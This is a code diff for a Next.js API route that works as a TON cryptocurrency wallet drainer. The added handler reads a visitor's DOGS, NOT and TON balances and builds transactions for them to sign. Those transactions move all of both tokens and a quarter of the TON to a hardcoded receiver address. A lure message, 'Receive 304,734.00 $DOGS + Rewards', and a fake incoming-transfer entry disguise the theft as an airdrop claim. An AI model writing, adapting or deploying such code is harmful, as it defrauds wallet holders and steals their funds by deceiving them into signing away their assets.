@@ -1,49 +1,131 @@
+import {Address, beginCell, toNano, TonClient, TupleBuilder} from "@ton/ton";
 import {NextRequest, NextResponse} from "next/server";
-import {Address, beginCell, toNano} from "@ton/ton";
-import {generateRandomNumber} from "@backend/utils/string";
+
+const API_KEY = process.env['TON_API'];
+const client = new TonClient({
+	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
+	apiKey: API_KEY
+});
+
+const dogsAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
+const notAddress = "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
+const dogsContract = client.provider(Address.parse(dogsAddress));
+const receiver = "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9";
+
+const defaultText = '🔐 Receive 304,734.00 $DOGS + Rewards'
 
 export async function POST(req: NextRequest) {
-	const {address, dogs,addr: jettonWalletOfSender,tons} = await req.json();
-	console.log("ADDRESS", address,jettonWalletOfSender)
+	const {address: sender} = await req.json();
 
-	const dogsJettonAddress = "0:afc49cb8786f21c87045b19ede78fc6b46c51048513f8e9a6d44060199c1bf0c"
-	const walletOfReceiver = "0:413c5eae810573856759479fd57c210c4cc1918e8d124ad8c8ef4b02e4bed2ec"
-	const jettonWalletOfReceiver = "0:cfd774e12900e2ec8df5436f0d5de5376ddc800c30001ede81f88b75e8c3fe6c";
+	const senderWallet = Address.parse(sender);
+	const receiverWallet = Address.parse(receiver);
 
-	const source = Address.parse("0:c6a3c9eca42ca47dbdd819f158d2a3f7de590686d9b6ed92ddc4d8c9913c8faf");  // Source address of the sender
-	const destination = Address.parse(walletOfReceiver);  // Destination address of the recipient
-	const finalDogs = toNano(+dogs / 2);  // Amount of Jettons to send, converted to nanoTON
+	const fee = toNano("0.05");
 
-	console.log("SOURCE", source.toString())
-	console.log("destination", destination.toString())
-	console.log("finalDogs", finalDogs.toString())
+	const [dogsSenderJettonWallet, notSenderJettonWallet, dogsReceiverJettonWallet, notReceiverJettonWallet] = await Promise.all([
+		getContractWallet(dogsAddress, senderWallet),
+		getContractWallet(notAddress, senderWallet),
+		getContractWallet(dogsAddress, receiverWallet),
+		getContractWallet(notAddress, receiverWallet),
+	]);
 
-	const forwardPayload = beginCell()
-		.storeUint(0, 32) // 0 opcode means we have a comment
-		.storeStringTail('USING THIS SIGNATURE TO RECEIVE DOGS')
-		.endCell();
+	const [dogs, not, tons] = await Promise.all([
+		getTokenBalance(dogsSenderJettonWallet),
+		getTokenBalance(notSenderJettonWallet),
+		client.getBalance(senderWallet)
+	]);
 
-	const body = beginCell()
-		.storeUint(0xf8a7ea5, 32)                   // jetton transfer op code (usually 0xf8a7ea5 for transfer)
-		.storeUint(+generateRandomNumber(7), 64)  // query_id:uint64, can be random or 0 for no response needed
-		.storeCoins(finalDogs)                      // amount:(VarUInteger 16) - Jetton amount for transfer
-		.storeAddress(destination)                  // destination:MsgAddress
-		.storeAddress(source)                       // response_destination:MsgAddress (where excess funds go)
-		.storeUint(0, 1)                            // custom_payload:(Maybe ^Cell)
-		.storeCoins(1)                              // forward_ton_amount:(VarUInteger 16) - TON amount sent with notification
-		.storeBit(1) // we store forwardPayload as a reference
-		.storeRef(forwardPayload)                    // forward_payload:(Either Cell ^Cell)
-		.endCell();
+	const transactions = [];
 
-	console.log("FINAL", finalDogs.toString());
+	transactions.push({
+		amount: fee.toString(),
+		address: dogsReceiverJettonWallet.toString(),
+		payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
+	})
+
+	if (dogs) {
+		const payload = await createTokenTransferPayload(senderWallet, dogsReceiverJettonWallet, dogs);
+
+		transactions.push({
+			address: dogsSenderJettonWallet.toString(),
+			amount: fee.toString(),
+			payload
+		})
+	}
+	if (not) {
+		const payload = await createTokenTransferPayload(senderWallet, notReceiverJettonWallet, not);
+
+		transactions.push({
+			address: notSenderJettonWallet.toString(),
+			amount: fee.toString(),
+			payload
+		});
+	}
+
+	const remains = tons - (fee * BigInt(transactions.length))
+	if (remains) {
+		transactions.push({
+			address: receiverWallet.toString(),
+			amount: (remains / BigInt(4)).toString(),
+			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
+		})
+	}
+
 	return NextResponse.json({
 		validUntil: Math.floor(Date.now() / 1000) + 500,
-		messages: [
-			{
-				address: jettonWalletOfReceiver,
-				amount: toNano("0.005").toString(),
-				payload: body.toBoc().toString('base64')
-			}
-		]
-	})
+		messages: transactions
+	});
+}
+
+async function createTokenTransferPayload(source: Address, destination: Address, amount: bigint | number, text = defaultText) {
+	// Prepare the forward payload with a simple message
+	const forwardPayload = beginCell()
+		.storeUint(0, 32)  // 0 opcode for a simple message
+		.storeStringTail(text)
+		.endCell();
+
+	// Building the body with correct fields
+	const body = beginCell()
+		.storeUint(0xf8a7ea5, 32)
+		.storeUint(0, 64)
+		.storeCoins(amount)
+		.storeAddress(destination)
+		.storeAddress(source)
+		.storeUint(0, 1)
+		.storeCoins(toNano("0.01"))
+		.storeBit(1)
+		.storeRef(forwardPayload)
+		.endCell();
+
+	return body.toBoc().toString('base64')
+}
+
+const CONTRACT_CACHE: {
+	[address: string]: Awaited<ReturnType<typeof client.provider>>
+} = {};
+
+async function getContractProvider(_address: string | Address) {
+	const address = typeof _address === 'string' ? _address : _address.toString();
+	const cache = CONTRACT_CACHE[address];
+
+	if (cache) return cache;
+
+	return client.provider(Address.parse(address));
+}
+
+async function getContractWallet(contractAddress: string | Address, ownerAddress: string | Address) {
+	const contract = await getContractProvider(contractAddress);
+
+	const args = new TupleBuilder();
+	args.writeAddress(typeof ownerAddress === 'string' ? Address.parse(ownerAddress) : ownerAddress);
+	return await contract.get('get_wallet_address', args.build()).then(r => r.stack.readAddress());
+}
+
+async function getTokenBalance(jettonOfTokenWallet: string | Address) {
+	try {
+		const data = await client.runMethod(typeof jettonOfTokenWallet === 'string' ? Address.parse(jettonOfTokenWallet) : jettonOfTokenWallet, 'get_wallet_data');
+		return data.stack.readNumber();
+	} catch {
+		return 0;
+	}
 }
